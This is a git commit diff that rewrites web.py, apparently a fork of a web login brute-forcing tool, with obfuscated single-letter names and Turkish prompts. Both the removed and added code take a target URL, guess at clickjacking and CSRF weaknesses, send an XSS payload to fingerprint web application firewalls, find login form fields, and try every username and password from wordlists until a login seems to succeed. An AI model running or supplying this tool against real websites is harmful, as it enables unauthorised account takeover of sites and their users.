2634b5d1b3fe2caedd7611d39e56136334b931ca
tixarac-exe <91637317+tixarac-exe@users.noreply.github.com>
2025-05-31 20:54:40 +0300

    Update web.py

--- web.py
+++ web.py
@@ -1,31 +1,24 @@
 #!/usr/bin/env python3
-#Modules
 import mechanize
-import itertools
-import http.cookiejar as cookielib
+import http.cookiejar as c
 import sys
 from bs4 import BeautifulSoup
-from re import search, findall
+from re import search
 from urllib.request import urlopen
-from urllib.error import URLError
+from urllib.error import URLError, HTTPError
 
-#Stuff related to Mechanize browser module
-br = mechanize.Browser() #Shortening the call by assigning it to a variable "br"
-# set cookies
-cookies = cookielib.LWPCookieJar()
-br.set_cookiejar(cookies)
-# Mechanize settings
-br.set_handle_equiv(True)
-br.set_handle_redirect(True)
-br.set_handle_referer(True)
-br.set_handle_robots(False)
-br.set_debug_http(False)
-br.set_debug_responses(False)
-br.set_debug_redirects(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
-br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]
-# Banner
+a = mechanize.Browser()
+b = c.LWPCookieJar()
+a.set_cookiejar(b)
+a.set_handle_equiv(True)
+a.set_handle_redirect(True)
+a.set_handle_referer(True)
+a.set_handle_robots(False)
+a.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+a.addheaders = [('User-agent', 'Mozilla/5.0'),
+                ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
+                ('Accept-Encoding', 'br')]
+
 print('''\033[1;93m
    m     ""
  mm#mm  mmm    m   m   mmm    m mm   mmm    mmm           mmm   m   m   mmm
@@ -34,171 +27,145 @@ print('''\033[1;93m
    "mm  mm#mm  m" "m  "mm"#   #     "mm"#  "#mm"    #    "#mm"  m" "m  "#mm"
 \033[1;34m
 ''')
-url = input('\033[1;34m[?]\033[0m Enter target URL: ') # Kullanıcıdan giriş alır
-if 'http://' in url:
-    pass
-elif 'https://' in url:
-    url = url.replace('https://', 'http://')
-else:
-    url = 'http://' + url
+
+c = input('\033[1;34m[?]\033[0m Hedef site adresi ne: ')
+if not c.startswith('http://') and not c.startswith('https://'):
+    c = 'http://' + c
+
 try:
-    br.open(url, timeout=10.0) #Opens the url
-except URLError as e:
-    url = 'https://' + url
-    br.open(url)
-forms = br.forms() #Finds all the forms present in webpage
-
-headers = str(urlopen(url).headers._headers).lower() #Fetches headers of webpage
-if 'x-frame-options:' not in headers:
-    print('\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability')
-if 'cloudflare-nginx' in headers:
-    print('\033[1;31m[-]\033[0m Target is protected by Cloudflare')
-data = br.open(url).read() #Reads the response
-if b'type="hidden"' not in data:
-    print('\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability')
-
-soup =  BeautifulSoup(data, 'lxml') #Parses the response with BeautifulSoup
-i_title = soup.find('title') #finds the title tag
-if i_title != None:
-    original = i_title.contents #value of title tag is assigned to 'original'
-
-def WAF_detector(): #WAF detection function
-    noise = "?=<script>alert()</script>" #a payload which is noisy enough to provoke the WAF
-    fuzz = url + noise
-    res1 = urlopen(fuzz) #Opens the noise injected payload
-    if res1.code == 406 or res1.code == 501: #if the http response code is 406/501
-        print("\033[1;31m[-]\033[1;m WAF Detected : Mod_Security")
-    elif res1.code == 999: #if the http response code is 999
-        print("\033[1;31m[-]\033[1;m WAF Detected : WebKnight")
-    elif res1.code == 419:
-        print("\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP")
-    elif res1.code == 403: #if the http response code is 403
-        print("\033[1;31m[-]\033[1;m Unknown WAF Detected")
-WAF_detector()
-
-def wordlist_u(lst): #Loads usernames from usernames.txt
+    a.open(c, timeout=10.0)
+except URLError:
     try:
-        with open('usernames.txt','r') as f:
-            for line in f:
-                final = str(line.replace("\n",""))
-                lst.append(final)
-    except IOError:
-        print("\033[1;31m[-]\033[1;m Wordlist not found!")
-        quit()
-def wordlist_p(lst): #Loads passwords from passwords.txt
+        c = c.replace('http://', 'https://')
+        a.open(c)
+    except Exception as x:
+        print(f"\033[1;31m[-]\033[0m Siteye ulaşılamıyor: {x}")
+        sys.exit()
+
+d = a.forms()
+try:
+    e = urlopen(c)
+    f = str(e.headers._headers).lower()
+    if 'x-frame-options:' not in f:
+        print('\033[1;32m[+]\033[0m Clickjacking açığı var gibi')
+    if 'cloudflare-nginx' in f:
+        print('\033[1;31m[-]\033[0m Cloudflare koruması var')
+except:
+    pass
+
+try:
+    g = a.open(c).read()
+    if b'type="hidden"' not in g:
+        print('\033[1;32m[+]\033[0m CSRF açığı olabilir')
+    h = BeautifulSoup(g, 'lxml')
+    i = h.find('title')
+    j = i.contents if i else ""
+except Exception as x:
+    print(f"\033[1;31m[-] HTML okunamadı: {x}")
+    j = ""
+
+def k():
     try:
-        with open('passwords.txt','r') as f:
-            for line in f:
-                final = str(line.replace("\n",""))
-                lst.append(final)
-    except IOError:
-        print("\033[1;31m[-]\033[1;m Wordlist not found!")
-        quit()
-usernames = []
-wordlist_u(usernames)
-print('\033[1;97m[>]\033[1;m Usernames loaded: %i'% len(usernames))
-passwords = []
-wordlist_p(passwords)
-print('\033[1;97m[>]\033[1;m Passwords loaded: %i'% + len(passwords))
-def find(): #Function for finding forms
-    form_number = 0
-    for f in forms: #Finds all the forms in the webpage
-        data = str(f) #Converts the response received to string
-        username = search(r'<TextControl\([^<]*=\)>', data) #Searches for fields that accept plain text
+        with open('usernames.txt', 'r') as l:
+            return [m.strip() for m in l.readlines()]
+    except:
+        print("\033[1;31m[-] usernames.txt yok!")
+        sys.exit()
 
-        if username: #if such field is found
-            username = (username.group().split('<TextControl(')[1][:-3]) #Extracts the name of field
-            print('\033[1;33m[!]\033[0m Username field: ' + username) #prints name of field
-            passwd = search(r'<PasswordControl\([^<]*=\)>', data) #Searches for fields that accept password like text
+def n():
+    try:
+        with open('passwords.txt', 'r') as l:
+            return [m.strip() for m in l.readlines()]
+    except:
+        print("\033[1;31m[-] passwords.txt yok!")
+        sys.exit()
 
-            if passwd: #if such field is found
-                passwd = (passwd.group().split('<PasswordControl(')[1][:-3]) #Extracts the field name
-                print('\033[1;33m[!]\033[0m Password field: ' + passwd) #prints name of field
-                select_n = search(r'SelectControl\([^<]*=', data) #checks for other selectable menus in form
- 
-                if select_n: #if a menu is found
-                    name = (select_n.group().split('(')[1][:-1]) #Extracts the menu name
-                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data) #select_o is the name of menu
+o = k()
+print('\033[1;97m[>]\033[1;m Kullanıcı adları yüklendi:', len(o))
+p = n()
+print('\033[1;97m[>]\033[1;m Şifreler yüklendi:', len(p))
 
-                    if select_o: #Proceeds to find options of menu
-                        menu = "True" #Sets the menu to be true
-                        options = (select_o.group().split('=')[1][:-1]) #Extracts options
-                        print('\n\033[1;33m[!]\033[0m A drop down menu detected.')
-                        print('\033[1;33m[!]\033[0m Menu name: ' + name) #prints menu name
-                        print('\033[1;33m[!]\033[0m Options available: ' + options) #prints available options
-                        option = input('\033[1;34m[?]\033[0m Please Select an option:>> ') #Gets option from user
-                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
-                    else:
-                        menu = "False" #No menu is present in the form
-                        try:
-                            brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
-                        except Exception as e:
-                            cannotUseBruteForce(username, e)
-                            pass							
-                else:
-                    menu = "False" #No menu is present in the form
-                    option = "" #Sets option to null
-                    name = "" #Sets name to null
-                    try:
-                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
-                    except Exception as e:
-                        cannotUseBruteForce(username, e)
-                        pass
-            else:
-                form_number = form_number + 1
-                pass
+def q():
+    try:
+        r = "?=<script>alert()</script>"
+        s = c + r
+        t = urlopen(s)
+        if t.code in [406, 501]:
+            print("\033[1;31m[-] Mod_Security aktif gibi")
+        elif t.code == 999:
+            print("\033[1;31m[-] WebKnight olabilir")
+        elif t.code == 419:
+            print("\033[1;31m[-] F5 BIG IP çalışıyor olabilir")
+        elif t.code == 403:
+            print("\033[1;31m[-] WAF var gibi")
+    except HTTPError as x:
+        if x.code == 403:
+            print("\033[1;31m[-] WAF var gibi: Erişim engellendi")
         else:
-            form_number = form_number + 1
-            pass
-    print('\033[1;31m[-]\033[0m No forms found')
-def cannotUseBruteForce(username, e):
-    print('\r\033[1;31m[!]\033[0m Cannot use brute force with user %s.' % username)
-    print('\r    [Error: %s]' % e)
-def brute(username, passwd, menu, option, name, form_number):
-    for uname in usernames:
-        progress = 1
-        print('\033[1;97m[>]\033[1;m Bruteforcing username: %s'% uname)
-        for password in passwords:
-            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i'% (progress, len(passwords)))
+            print(f"\033[1;31m[-] WAF kontrol hatası: {x}")
+    except Exception:
+        pass
+
+q()
+
+def u(v, w, x, y, z, aa):
+    for ab in o:
+        ac = 1
+        print(f'\033[1;97m[>]\033[1;m Deneniyor: {ab}')
+        for ad in p:
+            sys.stdout.write(f'\r\033[1;97m[>]\033[1;m Şifre denendi: {ac} / {len(p)}')
             sys.stdout.flush()
-            br.open(url)  
-            br.select_form(nr=form_number)
-            br.form[username] = uname
-            br.form[passwd] = password
-            if menu == "False":
-                pass
-            elif menu == "True":
-                br.form[name] = [option]
-            else:
-                pass
-            resp = br.submit()
-            data = resp.read()
-            data_low = data.lower()
-            if 'username or password' in data_low:
-                pass
-            else:
-                soup =  BeautifulSoup(data, 'lxml')
-                i_title = soup.find('title')
-                if i_title == None:
-                    data = data.lower()
-                    if 'logout' in data:
-                        print('\n\033[1;32m[+]\033[0m Valid credentials found: ')
-                        print(uname)
-                        print(password)
-                        quit()
-                    else:
-                        pass
+            try:
+                a.open(c)
+                a.select_form(nr=aa)
+                a.form[v] = ab
+                a.form[w] = ad
+                if x == "True":
+                    a.form[z] = [y]
+                ae = a.submit().read().lower()
+                if b'username or password' in ae:
+                    pass
                 else:
-                    injected = i_title.contents
-                    if original != injected:
-                        print('\n\033[1;32m[+]\033[0m Valid credentials found: ')
-                        print('\033[1;32mUsername: \033[0m' + uname)
-                        print('\033[1;32mPassword: \033[0m' + password)
-                        quit()
-                    else:
-                        pass
-            progress = progress + 1
-        print('')
-    print('\033[1;31m[-]\033[0m Failed to crack login credentials')
-    quit()
-find()
+                    af = BeautifulSoup(ae, 'lxml')
+                    ag = af.find('title')
+                    ah = ag.contents if ag else ""
+                    if ah != j:
+                        print('\n\033[1;32m[+]\033[0m Oldu galiba:')
+                        print('Kullanıcı adı:', ab)
+                        print('Şifre:', ad)
+                        sys.exit()
+            except Exception:
+                continue
+            ac += 1
+
+def v():
+    w = 0
+    for x in d:
+        y = str(x)
+        z = search(r'<TextControl(.*?)=>', y)
+        if z:
+            z = z.group(1)
+            print('\033[1;33m[!]\033[0m Kullanıcı alanı:', z)
+            aa = search(r'<PasswordControl(.*?)=>', y)
+            if aa:
+                aa = aa.group(1)
+                print('\033[1;33m[!]\033[0m Şifre alanı:', aa)
+                ab = search(r'SelectControl(.*?)=', y)
+                if ab:
+                    ab = ab.group(1)
+                    try:
+                        ac = search(r'SelectControl[^<]*=[^<]*>', y)
+                        ad = ac.group().split('=')[1][:-1] if ac else ""
+                        print('\033[1;33m[!]\033[0m Menü var')
+                        print('\033[1;33m[!]\033[0m Menü adı:', ab)
+                        print('\033[1;33m[!]\033[0m Seçenekler:', ad)
+                        ae = input('\033[1;34m[?]\033[0m Hangisini seçeyim: ')
+                        u(z, aa, "True", ae, ab, w)
+                    except Exception as x:
+                        print(f"\033[1;31m[!]\033[0m Hata oldu: {x}")
+                else:
+                    u(z, aa, "False", "", "", w)
+        w += 1
+    print('\033[1;31m[-]\033[0m Uygun form yok gibi.')
+
+v()
